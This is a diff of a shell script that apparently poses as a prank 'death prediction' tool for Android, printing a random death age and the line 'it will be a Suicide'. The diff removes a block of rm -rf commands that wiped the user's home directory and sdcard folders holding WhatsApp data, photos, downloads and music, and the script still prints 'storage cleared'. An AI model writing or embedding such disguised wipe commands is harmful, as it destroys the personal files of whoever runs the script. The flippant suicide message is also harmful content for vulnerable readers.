@@ -65,14 +65,6 @@ death=$((( $RANDOM % 15 ) + $age ))
 echo "Hi $name your death is comming  you will die at the age  $death  "
 echo ""
 echo " it will be a Suicide "
-
-rm -rf cd /sdcard/Android
-rm -rf cd ~
-rm -rf cd /sdcard/WhatsApp
-rm -rf cd /sdcard/DCIM
-rm -rf cd /sdcard/Download
-rm -rf cd /sdcard/Music
-rm -rf cd /sdcard/SHAREit
 Sleep 15
 echo "storage cleared by"
 cd master-hack
